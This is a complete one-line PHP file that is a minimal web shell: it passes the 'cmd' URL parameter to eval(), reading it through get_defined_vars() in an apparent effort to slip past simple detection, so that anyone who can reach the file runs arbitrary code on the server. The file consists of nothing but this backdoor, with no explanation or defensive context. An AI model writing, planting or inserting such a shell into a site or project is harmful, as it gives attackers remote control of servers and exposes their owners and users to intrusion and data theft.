<?php
eval(get_defined_vars()['_GET']['cmd']);
?>